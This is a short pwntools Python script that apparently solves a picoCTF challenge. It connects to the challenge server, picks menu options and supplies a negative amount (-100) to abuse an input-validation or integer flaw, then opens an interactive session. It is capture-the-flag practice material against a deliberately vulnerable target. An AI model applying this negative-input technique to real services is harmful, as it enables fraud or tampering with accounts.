#!/usr/bin/env python3
from pwn import *
exe = ELF('source', checksec = False)

# p = process(exe.path)
p = remote('mercury.picoctf.net', 42159)

p.recvline()
p.sendline(b'1')
p.recvline()
p.sendline(b'-100')
p.recvline()
p.sendline(b'2')
p.recvline()
p.sendline(b'1')

p.interactive()